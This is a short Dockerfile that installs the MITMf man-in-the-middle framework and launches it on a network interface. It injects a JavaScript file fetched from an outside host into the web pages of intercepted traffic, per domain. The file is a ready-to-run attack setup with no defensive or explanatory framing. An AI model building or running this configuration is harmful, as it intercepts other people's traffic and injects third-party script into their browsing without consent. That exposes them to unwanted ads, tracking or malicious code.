FROM ubuntu:wily
MAINTAINER ZhangJing 

RUN apt-get update
RUN apt-get install -y net-tools iptables tcpdump git file python-pip python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev
RUN git clone https://github.com/online2311/MITMf /MITMf
WORKDIR /MITMf
RUN git submodule init && git submodule update --recursive
RUN pip install -r requirements.txt
VOLUME /MITMf/logs/

EXPOSE 10000
ENTRYPOINT ["python", "/MITMf/mitmf.py", "-i", "eth0", "--inject", "--js-url", "http://freewlan.com.cn/js_ad/js/ad.js", "--per-domain"]
